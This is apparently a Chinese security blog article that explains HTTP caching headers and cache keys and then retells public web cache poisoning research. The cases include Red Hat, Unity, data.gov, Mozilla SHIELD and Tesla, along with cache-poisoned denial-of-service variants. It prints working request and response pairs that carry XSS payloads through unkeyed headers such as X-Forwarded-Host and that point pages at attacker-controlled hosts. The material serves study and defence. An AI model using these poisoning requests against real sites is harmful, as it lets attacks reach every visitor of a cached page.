<h3 id="1-3-HTTP协议如何控制web缓存"><a href="#1-3-HTTP协议如何控制web缓存" class="headerlink" title="1.3 HTTP协议如何控制web缓存"></a>1.3 HTTP协议如何控制web缓存</h3><p>如果是服务端代理的形式，发起http请求时候，会遇到三种情况</p>
<ul>
<li><p>无缓存标识/无缓存结果，直接请求服务器</p>
<img src="../images/pics/web缓存投毒攻击/image-20210218101505225.png" alt="image-20210218101505225" style="zoom:50%;" /></li>
<li><p>存在缓存结果和缓存标识，但结果失效，使用协商缓存。有两种情况</p>
<ol>
<li><p>协商后内容没有更新</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222164524255.png" alt="image-20210222164524255"></p>
</li>
<li><p>协商后内容更新</p>
<img src="../images/pics/web缓存投毒攻击/image-20210218131218339.png" alt="image-20210218131218339" style="zoom:50%;" /></li>
</ol>
</li>
<li><p>存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果</p>
</li>
</ul>
<p>​       <img src="../images/pics/web缓存投毒攻击/image-20210218131321294.png" alt="image-20210218131321294" style="zoom:50%;" /></p>
<p><strong>http协议控制缓存在两种方式，分为强制缓存和协商缓存。</strong></p>
<h4 id="1-强制缓存"><a href="#1-强制缓存" class="headerlink" title="1. 强制缓存"></a>1. 强制缓存</h4><p>强制缓存由expires和cache-control控制，expire是HTTP1.0控制缓存的字段，而cache-control是http1.1控制缓存的字段，当两个同时存在时，cache-control优先</p>
<p><strong>Expires：</strong></p>
<p>Expires的值为缓存到期时间，即再次发起该请求时，如果客户端的时间小于Expires 的值时，直接使用缓存结果。Expires判断是否使用缓存的依据是比对客户端与服务端的相对时间，这就存在一个问题，如果客户端自己修改了一个时间，那么服务端定义的过期时间就毫无意义。所以后面HTTP1.1的cache-control使用了绝对时间来解决这个问题。</p>
<p><strong>Cache-Control</strong></p>
<p>在 <code>HTTP/1.1</code> 中，<code>Cache-Control</code> 是最重要的规则，主要用于控制网页缓存，主要取值为：</p>
<ul>
<li><code>public</code>：所有内容都将被缓存（客户端和代理服务器都可缓存）。</li>
<li><code>private</code>：所有内容只有客户端可以缓存，<code>Cache-Control</code> 的默认取值。</li>
<li><code>no-cache</code>：客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定。</li>
<li><code>no-store</code>：所有内容都不会被缓存。</li>
<li><code> max-age=xxx (xxx is numeric)</code>：缓存内容将在 <code>xxx</code> 秒后失效。</li>
<li><code>must-revalidate</code>: 使用一个过期资源需要和服务端协商</li>
</ul>
<p>如下图是某个请求的返回包内容里面有，max-age和expires同时存在，这种情况使用max-age。</p>
 <img src="../images/pics/web缓存投毒攻击/image-20210218094112468.png" alt="image-20210218094112468" style="zoom:50%;" />



<h4 id="2-协商缓存"><a href="#2-协商缓存" class="headerlink" title="2. 协商缓存"></a>2. 协商缓存</h4><p><strong>Last-Modified/If-Modified-Since</strong></p>
<p>1） Last-Modified</p>
<p>标示这个资源的最后修改时间，web服务器在响应请求时，告诉浏览器资源的最后修改时间。</p>
<p>2）If-Modified-Since</p>
<p>当资源过期时（使用cache-control标识的max-age)，发现资源具有Last-Modified声明，则再次向web服务器请求时带上头if-Modified-Since标识，与被请求资源的最后修改时间进行比对，若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省带宽)，告知浏览器继续使用所保存的cache。</p>
<p>我们看一个真实的例子，有一个请求如下</p>
<pre>GET /synthesislink/5651.html HTTP/1.1
Host: evt.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: _hc.v=3bb63beb-3ffc-8a6e-2582-88889c8cf324.1612693648; _lxsdk_cuid=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8; _lxsdk=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8
Upgrade-Insecure-Requests: 1
<font color="red">If-Modified-Since: Tue, 19 Mar 2019 23:59:20 GMT</font>
If-None-Match: "b14f1aaaae22302e7ab07e44a2990ac9"</pre>


<p>响应为：</p>
<pre>HTTP/1.1 <font color="red">304 Not Modified</font>
Server: NWS_TCloud_S2
Connection: close
Date: Mon, 22 Feb 2021 08:29:54 GMT
Cache-Control: max-age=300
Expires: Mon, 22 Feb 2021 08:34:54 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 0
X-NWS-LOG-UUID: 1089614981990302347 9fc91eb65c4db73a1ff8259ab718718d
X-Via: DIANXIN-JIANGSU_31(304:refresh_hit);DIANXIN-JIANGSU_30(304:ims_hit)
X-Daa-Tunnel: hop_count=1</pre>


<p>观察响应，X-NWS-LOG-UUID是腾讯的CDN节点（<a href="https://segmentfault.com/a/1190000006673084">各厂商CDN节点</a>），并且有过期时间<code>Expires: Mon, 22 Feb 2021 08:34:54 GMT</code> 。由这些信息可知，这是一个CND web缓存。观察请求，<code>If-Modified-Since: Tue, 19 Mar 2019 23:59:20 GMT</code>还是2019年的。说明Last-Modified是一个很早的时间，只有If-Modified-Since比Last-Modified时间早才会返回304，所以我们修改一个更早的时间，</p>
<pre>GET /synthesislink/5651.html HTTP/1.1
Host: evt.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: _hc.v=3bb63beb-3ffc-8a6e-2582-88889c8cf324.1612693648; _lxsdk_cuid=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8; _lxsdk=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8
Upgrade-Insecure-Requests: 1
<font color="red">If-Modified-Since: Tue, 19 Mar 2021 23:59:20 GMT</font>
If-None-Match: "b14f1aaaae22302e7ab07e44a2990ac9"</pre>



<pre>HTTP/1.1 200 OK
Server: NWS_TCloud_static_msoc2
Connection: close
Date: Mon, 22 Feb 2021 08:46:54 GMT
Cache-Control: max-age=300
Expires: Mon, 22 Feb 2021 08:51:54 GMT
<font color="red">Last-Modified: Tue, 19 Mar 2019 23:59:20 GMT</font>
Content-Type: text/html;charset=utf-8
Content-Length: 20774
X-NWS-UUID-VERIFY: 29a5326de1ddd86a7ec8ed63875a0b94
X-NWS-LOG-UUID: 9138859087622259624 5476affaca7698add4248c29c918eb79
X-Cache-Lookup: Hit From Disktank3
Keep-Alive: timeout=5
Accept-Ranges: bytes
ETag: "b14f1aaaae22302e7ab07e44a2990ac9"
X-Amz-Id-2: adee119763fb198799edc98469117b30
X-Amz-Request-Id: 1613955595686967
X-Mss-Trace-Id: 5209824156916383142
X-Route-Trace-Id: 5293343060162248102
x-amz-storage-class: STANDARD
Access-Control-Allow-Origin: *
X-Daa-Tunnel: hop_count=3
X-Cache-Lookup: Hit From Inner Cluster
X-Via: DIANXIN-SHANDONG_144(200:miss);DIANXIN-SHANDONG_166(200:refresh_miss)
X-Cache-Lookup: Hit From Upstream
X-Cache-Lookup: Hit From Inner Cluster</pre>




<p>观察上面两个请求包，可以知道通过修改<code>If-Modified-Since</code>刷新了缓存，在响应中也出现了时间Last-Modified的值为2019年的日期，印证了我们的猜想。这个例子也说明通过Last-Modified/If-Modified-Since控制缓存是没有什么意义的，可以对其篡改。</p>
<p><strong>Etag/If-None-Match</strong></p>
<p>Etag/If-None-Match也要配合Cache-Control使用。</p>
<p>1）etag: </p>
<p>web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</p>
<p>2）If-None-Match：</p>
<p>当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。</p>
<p><strong>4. 既生Last-Modified何生Etag</strong></p>
<p>既然使用Last-Modified能够知道资源是否足够新，为什么还需要Etag（实体标识）呢？主要解决如下几个问题。</p>
<p>1） Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间。</p>
<p>2）如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存。</p>
<p>3）有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。</p>
<p>Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag是可以一起使用的，服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。</p>
<p>如下图etag和last-modified同时存在，优先使用etag。</p>
 <img src="../images/pics/web缓存投毒攻击/image-20210218134240191.png" alt="image-20210218134240191" style="zoom:50%;" />







<h3 id="1-4-cache-key"><a href="#1-4-cache-key" class="headerlink" title="1.4 cache key"></a>1.4 cache key</h3><p>当缓存收到一个请求，它需要判断是否存有该请求的响应，如果有就直接返回，没有就将该请求转发到服务器。</p>
<p>缓存为了确定本次请求的响应是否存在，它需要拿本次请求和之前保留的做匹配，如果匹配上就说明存有响应。匹配时如果一个字节一个字节的比较效率会很低，因为HTTP请求充斥着对于cache来说无关紧要的信息，比如User-Agent。</p>
<p>为了解决这个问题，提出了cache key的概念。cache key就是用来使用http请求的其中几个元素来确认这个资源之前被请求过。</p>
<pre>GET <font color="red">/blog/post.php?mobile=1</font> HTTP/1.1
Host: <font color="red">example.com</font>
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://google.com/
Cookie: jessionid=xyz;
Connection: close</pre>


<p>比如上面的请求包的 cache key 就是:</p>
<pre>    Cache Key: https|GET|example.com|/blog/post.php?mobile=1</pre>

<p>大多数cache key是host和路由，但这并不是绝对的。</p>
<p>如果一个非cache key的缓存资源被污染了，那么后续用户访问同一个cache key的资源会被影响。</p>
<p>如下两个请求对于cache来说是一样的，请求1的响应会是请求2的响应。</p>
<p>请求1:</p>
<pre>GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=<font color="red">pl</font>;
Connection: close</pre>


<p>请求2:</p>
<pre>GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=<font color=red>en</font>;
Connection: close
</pre>



<p>结果就是发起第二个请求的人会收到错误的语言。这就是问题所在，任何一个不存在于 cache key的不同输入都有可能作为response存在于cache中，然后返回给其他用户。理论上网站可以使用响应头的’Vary’字段来制定将什么内容加入到 cache key ，比如加入<code>Vary: Cookie</code>那么缓存服务器就会比对Cookie是否也一样，上述两个请求肯定不一样，所以缓存服务器不会直接返回之前存储的内容，而是转发给服务器。但实际上，响应头的’Vary’基本都会被开发者忽略，像Cloudflare这种CDN厂商完全忽略’Vary’</p>
<h3 id="1-5-unkeyed"><a href="#1-5-unkeyed" class="headerlink" title="1.5 unkeyed"></a>1.5 unkeyed</h3><p>unkeyed在本文中就是指不属于cache key，但是这个unkeyed值可能导致一些危害的参数或者HTTP头。</p>
<h3 id="1-6-缓存投毒"><a href="#1-6-缓存投毒" class="headerlink" title="1.6 缓存投毒"></a>1.6 缓存投毒</h3><p>缓存投毒的攻击理念就是发起一个能导致有害响应的请求，让cache保存此响应，然后提供给其他用户。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210106201009322.png" alt="image-20210106201009322"></p>
<p>本文主要讨论使用未加入 cache key的HTTP请求头的投毒方式，当然不止这一种，其他方式比如请求http 请求拆分、请求走私。其他方式将在后续的文章进行分享。类似的有一种<a href="https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html">web缓存欺骗</a>的攻击方式，不要混淆了这两种攻击方式，后续有机会可以分享一下这种攻击方式。</p>
<h3 id="1-7-缓存投毒的影响"><a href="#1-7-缓存投毒的影响" class="headerlink" title="1.7 缓存投毒的影响"></a>1.7 缓存投毒的影响</h3><p>缓存投毒的影响严重依赖以下两个重要因素。</p>
<ul>
<li>缓存投毒攻击的影响程度取决于注入的payload，和大多数攻击方式一样，缓存投毒需要和其他漏洞组合起来以提升危害性。</li>
<li>访问量。因为缓存投毒的攻击目标是投毒后的资源访问群体，所以访问的人越多就危害越大。</li>
</ul>
<h3 id="1-8-如何进行一个缓存投毒漏洞的挖掘"><a href="#1-8-如何进行一个缓存投毒漏洞的挖掘" class="headerlink" title="1.8 如何进行一个缓存投毒漏洞的挖掘"></a>1.8 如何进行一个缓存投毒漏洞的挖掘</h3><p>总的来说，挖掘一个缓存投毒漏洞的步骤如下：</p>
<p><strong>1. 确认unkeyed</strong></p>
<p>第一步就是确认没有被纳入cache key的http请求头，通常是找参数或者请求头回显点能否和缓存关联，手工来检测是一项非常乏味的工作，因此作者开发了一款叫 Param Miner的 Burp Suite插件来自动挖掘。但是我在实际使用过程中效果很一般，找一些常见的请求头回显还是有点用的。</p>
<p><strong>2. 构造利用手段</strong></p>
<p>在找到unkeyed后，就是判断判断是否能够造成危害，通常的方法是结合xss等漏洞。</p>
<h2 id="2-不同的攻击方式"><a href="#2-不同的攻击方式" class="headerlink" title="2. 不同的攻击方式"></a>2. 不同的攻击方式</h2><p>让我们看看作者讲的一些真实案例。通常，测试这些站点都是点到为止，不会对站点造成影响。由于这些站点都是公开站点，所以不可避免要修改一些内容。</p>
<h3 id="2-1-redhat的一个投毒案例"><a href="#2-1-redhat的一个投毒案例" class="headerlink" title="2.1 redhat的一个投毒案例"></a>2.1 redhat的一个投毒案例</h3><p>主页中，<code>X-Forwarded-Host: canary</code>出现在了meta标签中。这里<code>X-Forwarded-Host: canary</code>就是unkeyed</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?cb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.redhat.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>canary</span><br><span class="line"></span><br><span class="line"><span class="lasso">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="lasso"><span class="keyword">Cache</span><span class="params">-Control</span>: <span class="keyword">public</span>, no<span class="params">-cache</span></span></span><br><span class="line"><span class="lasso">…</span></span><br><span class="line"><span class="lasso">&lt;meta property=<span class="string">&quot;og:image&quot;</span> content=<span class="string">&quot;https://canary/cms/social.png&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了不影响其他用户，这里作者找到一个可以自己定义参数的页面，添加xss的poc。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?dontpoisoneveryone=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.redhat.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="xml">Cache-Control: public, no-cache</span></span><br><span class="line"><span class="xml">…</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">property</span>=<span class="string">&quot;og:image&quot;</span> <span class="attr">content</span>=<span class="string">&quot;https://a.&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;/&gt; </span></span><br></pre></td></tr></table></figure>

<p>成功触发了POC。但是这只是一个self xss，是没有什么危害性。但是如果存在缓存投毒，就可以将XSS存储到缓存中，之后访问的用户就会触发XSS。从而攻击到其他用户。</p>
<h3 id="2-2-投毒时机"><a href="#2-2-投毒时机" class="headerlink" title="2.2 投毒时机"></a>2.2 投毒时机</h3><p>对于上面的例子，如果我们要对主页进行真的投毒攻击，我们可能会选择使用Burp Intruder模块进行持续性投毒，因为我们不知道缓存在什么时候过期，并且要在它刚好过期的时候投毒成功。如果持续发送大量数据包，可能会引起注意，这会让投毒攻击变得困难，当然，可以通过对缓存系统进行逆向、查看文档和监控等手段来预测到期时间，但是这听起来就是一项艰苦的任务，有时候往往比这简单。</p>
<p>看下面的例子</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>unity3d.com</span><br><span class="line"><span class="attribute">X-Host</span><span class="punctuation">: </span>portswigger-labs.net</span><br><span class="line"></span><br><span class="line"><span class="routeros">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="routeros">Via: 1.1 varnish-v4</span></span><br><span class="line"><span class="routeros">Age: 174</span></span><br><span class="line"><span class="routeros">Cache-Control: public, <span class="attribute">max-age</span>=1800</span></span><br><span class="line"><span class="routeros">…</span></span><br><span class="line"><span class="routeros">&lt;script <span class="attribute">src</span>=<span class="string">&quot;https://portswigger-labs.net/sites/files/foo.js&quot;</span>&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>unity3d.com的响应头的Age和max-age分别提供了当前响应时间和过期时间，这为我们投毒时机做了明确的指引。</p>
<h3 id="2-3-选择性投毒"><a href="#2-3-选择性投毒" class="headerlink" title="2.3 选择性投毒"></a>2.3 选择性投毒</h3><p>如下例子中，Vary响应头告诉我们User-Agent头可能是缓存键的一部分，手工测试也确实如此，这种情况我们就可以定制User-Agent来选择性攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>redacted.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 … Firefox/60.0</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a&quot;&gt;&lt;iframe onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="xml">X-Served-By: cache-lhr6335-LHR</span></span><br><span class="line"><span class="xml">Vary: User-Agent, Accept-Encoding</span></span><br><span class="line"><span class="xml">…</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://a&quot;</span>&gt;</span>a<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span></span><br></pre></td></tr></table></figure>



<h3 id="2-4-DOM投毒"><a href="#2-4-DOM投毒" class="headerlink" title="2.4 DOM投毒"></a>2.4 DOM投毒</h3><p>如下的案例中，非缓存键是<code>X-Forwarded-Host: canary</code>，但是此处对XSS做了防御，不能直接利用XSS进行攻击。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/dataset</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>catalog.data.gov</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>canary</span><br><span class="line"></span><br><span class="line"><span class="routeros">HTTP/1.1 200 OK</span></span><br><span class="line"><span class="routeros">Age: 32707</span></span><br><span class="line"><span class="routeros">X-Cache: Hit <span class="keyword">from</span> cloudfront </span></span><br><span class="line"><span class="routeros">…</span></span><br><span class="line"><span class="routeros">&lt;body <span class="attribute">data-site-root</span>=<span class="string">&quot;https://canary/&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>作者在Burp Suite中做了一个替换，将canary替换为了类似<code>xxx.dnslog.cn</code>的dnslog地址，然后继续浏览，在dnslog平台收到了来自Firefox的如下请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/i18n/en</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.dnslog.net</span><br></pre></td></tr></table></figure>

<p>这个路径应该是藏在该站的某处，通过访问<code>https://catalog.data.gov/api/i18n/en</code>发现返回空的json数据。作者将en改为es，发现了一点蛛丝马迹。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/i18n/es</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>catalog.data.gov</span><br><span class="line"></span><br><span class="line"><span class="smalltalk"><span class="type">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="type">OK</span></span></span><br><span class="line"><span class="smalltalk">…</span></span><br><span class="line"><span class="smalltalk">&#123;<span class="comment">&quot;Show more&quot;</span>:<span class="comment">&quot;Mostrar más&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个文件将词组翻译成用户选择的语言，于是，作者在自己的vps上部署了一个相同路径的json XSS POC <code>&#123;&quot;Show more&quot;:&quot;&lt;svg onload=alert(1)&gt;&quot;&#125;</code>。发送如下数据包，投毒成功。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string"></span> /api/i18n/en <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> portswigger-labs.net</span><br><span class="line"></span><br><span class="line"><span class="erlang">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span></span><br><span class="line"><span class="erlang">...</span></span><br><span class="line"><span class="erlang">&#123;<span class="string">&quot;Show more&quot;</span>:<span class="string">&quot;&lt;svg onload=alert(1)&gt;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果就是任何页面包含“show more”都会执行POC。</p>
<h3 id="2-5-劫持-Mozilla-SHIELD系统"><a href="#2-5-劫持-Mozilla-SHIELD系统" class="headerlink" title="2.5 劫持 Mozilla SHIELD系统"></a>2.5 劫持 Mozilla SHIELD系统</h3><p>在测试<code> catalog.data.gov</code>的时候，log上还发现了如下的请求</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/recipe/signed/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 … Firefox/57.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>

<p>这个请求的小写<code>origin</code>引起了作者的注意。通过查询代理记录，发现是firefox的问题。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normandy.cdn.mozilla.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>xyz.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"><span class="dts">HTTP/<span class="number">1.1</span> <span class="number">200</span> <span class="class">OK</span></span></span><br><span class="line"><span class="class"><span class="dts"></span>&#123;</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;action-list&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/action/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;action-signed&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/action/signed/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;recipe-list&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/recipe/&quot;</span>,</span></span><br><span class="line"><span class="dts">  <span class="string">&quot;recipe-signed&quot;</span>: <span class="string">&quot;https://xyz.burpcollaborator.net/api/v1/recipe/signed/&quot;</span>,</span></span><br><span class="line"><span class="dts">   …</span></span><br><span class="line"><span class="dts">&#125;</span></span><br></pre></td></tr></table></figure>

<p>通过查询得知，该系统是<a href="https://wiki.mozilla.org/Firefox/Shield">SHIELD</a>，一个FIrefox的基础设施，用来营销和研究用户。只要打开firefox，就会定期请求。意味着作者可以控制数以千万的用户访问某个地址，因此可以被用于DDOS攻击。</p>
<h3 id="2-6-CPDOS"><a href="#2-6-CPDOS" class="headerlink" title="2.6 CPDOS"></a>2.6 CPDOS</h3><p>Cache-Poisoned Denial-of-Service (CPDoS)，由缓存投毒导致的DOS攻击。当攻击者插入一个unkeyed导致服务器返回400等其他异常，如果写入缓存，那么后续访问者只要访问该资源都会是400 状态码。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224135625306.png" alt="image-20210224135625306"></p>
<h4 id="三种不同的CPDOS"><a href="#三种不同的CPDOS" class="headerlink" title="三种不同的CPDOS"></a>三种不同的CPDOS</h4><p><strong>超大请求头</strong></p>
<p>HTTP Header Oversize(HHO)。<a href="https://httpwg.org/specs/">HTTP标准协议</a>没有给HTTP请求头设置任何大小限制，显然web服务器、web框架以及各种中间系统自己定义了HTTP请求头的大小限制。大多数web服务器或者代理服务器比如<a href="https://httpd.apache.org/">Apache HTTP Server (“httpd”)</a>限制请求头在8,192字节左右。然而有些网站中间层系统限制大于8,192字节。 比如<a href="https://aws.amazon.com/cloudfront/">Amazon Cloudfront CDN</a> 最大允许 20,480字节。</p>
<p>具体的攻击方式就是给unkeyed添加一个字节数小于缓存的请求头，但大于服务端的请求头，服务端就会返回错误然后存入缓存。之后请求该资源返回结果就是错误的响应。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224143048453.png" alt="image-20210224143048453"></p>
<p><strong>HTTP元字符</strong></p>
<p>HTTP Meta Character (HMC)。常见的元字符比如<code>\n</code>、 <code>\r</code> 、<code>\a</code>这些用于在HTTP请求中表示换行的以下字符。HMC类似于HHO，只是将有害的元字符替换了超大请求头</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224145431373.png" alt="image-20210224145431373"></p>
<p><strong>重写HTTP请求方法</strong></p>
<p>HTTP Method Override (HMO)。HTTP标准协议定义了GET、POST、DELETE和PUT四种请求方法。许多代理服务器、负载均衡、缓存、防火墙等只支持GET和POST。为了解决这个问题，一些基于REST的API或者web框架提供了例如X-HTTP-Method-Override、X-HTTP-Method、X-Method-Override等请求头来转换HTTP 请求方法。一旦请求到达服务器，服务器就会根据请求头修改请求方法，</p>
<pre>POST /items/1 HTTP/1.1
Host: example.org
<font color="red">X-HTTP-Method-Override: DELETE</font></pre>




<pre>HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 62


Resource has been successfully removed with the DELETE method.</pre>



<p>上诉代码通过添加请求头bypass了不允许的请求方法，同样的如果修改请求头会导致错误响应并且写入缓存，那么也是一个DOS攻击。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224152322209.png" alt="image-20210224152322209"></p>
<p>不同服务器及CDN的影响情况。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224163837785.png" alt="image-20210224163837785"></p>
<h4 id="特斯拉的一个缓存DOS漏洞"><a href="#特斯拉的一个缓存DOS漏洞" class="headerlink" title="特斯拉的一个缓存DOS漏洞"></a>特斯拉的一个缓存DOS漏洞</h4><p>漏洞地址：<a href="https://www.tesla.com/en_GB/roadster">https://www.tesla.com/en_GB/roadster</a></p>
<p>漏洞原因就是特斯拉的waf只要发现<code>burpcollaborator.net</code>就会Denied。并且waf是有缓存的，所以命中缓存后，请求该资源就会是Denied。如下添加<code>dontpoisoneveryone=1</code>是为了不响应正常用户，真实的攻击的话肯定会直接给<a href="https://www.tesla.com/en_GB/roadster%E6%8A%95%E6%AF%92%E3%80%82">https://www.tesla.com/en_GB/roadster投毒。</a></p>
<pre><font>GET /en_GB/roadster?dontpoisoneveryone=1</font> HTTP/1.1
<font color="red">Host: www.tesla.com</font>
Any-Header: burpcollaborator.net</pre>



<pre>HTTP/1.1 403 Forbidden
<br>Access Denied. Please contact waf@tesla.co</pre>












